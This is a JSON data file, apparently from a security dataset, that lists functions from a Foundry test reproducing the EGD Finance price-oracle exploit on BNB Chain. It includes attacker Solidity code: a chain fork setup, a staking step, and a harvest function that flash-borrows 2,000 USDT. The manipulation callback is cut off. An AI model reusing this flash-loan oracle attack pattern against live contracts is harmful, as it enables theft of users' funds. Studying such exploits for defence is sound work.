[
  {
    "contract/interface": "IEGD_Finance",
    "source_type": "victim_contract",
    "function_name": "bond",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IEGD_Finance",
    "source_type": "victim_contract",
    "function_name": "calculateAll",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IEGD_Finance",
    "source_type": "victim_contract",
    "function_name": "claimAllReward",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IEGD_Finance",
    "source_type": "victim_contract",
    "function_name": "getEGDPrice",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IEGD_Finance",
    "source_type": "victim_contract",
    "function_name": "stake",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 20_245_522);\n\n        vm.label(address(USDT_WBNB_LPPool), \"USDT_WBNB_LPPool\");\n        vm.label(address(EGD_USDT_LPPool), \"EGD_USDT_LPPool\");\n        vm.label(address(pancakeRouter), \"pancakeRouter\");\n        vm.label(EGD_Finance, \"EGD_Finance\");\n        vm.label(usdt, \"USDT\");\n        vm.label(egd, \"EGD\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        Exploit exploit = new Exploit();\n\n        console.log(\"--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------\");\n        console.log(\"Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8\");\n        console.log(\"Attacker Stake 100 USDT to EGD Finance\");\n\n        exploit.stake();\n        vm.warp(1_659_914_146); // block.timestamp = 2022-08-07 23:15:46(UTC)\n\n        console.log(\"-------------------------------- Start Exploit ----------------------------------\");\n        emit log_named_decimal_uint(\"[Start] Attacker USDT Balance\", IERC20(usdt).balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\n            \"[INFO] EGD/USDT Price before price manipulation\", IEGD_Finance(EGD_Finance).getEGDPrice(), 18\n        );\n        emit log_named_decimal_uint(\n            \"[INFO] Current earned reward (EGD token)\", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18\n        );\n        console.log(\"Attacker manipulating price oracle of EGD Finance...\");\n\n        exploit.harvest();\n\n        console.log(\"-------------------------------- End Exploit ----------------------------------\");\n        emit log_named_decimal_uint(\"[End] Attacker USDT Balance\", IERC20(usdt).balanceOf(address(this)), 18);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "harvest",
    "original_code": "    function harvest() public {\n        console.log(\"Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve\");\n        borrow1 = 2000 * 1e18;\n        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), \"0000\");\n        console.log(\"Flashloan[1] payback success\");\n        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); // refund all USDT\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        if (keccak256(data) == keccak256(\"0000\")) {\n",
    "description": ""
  }
]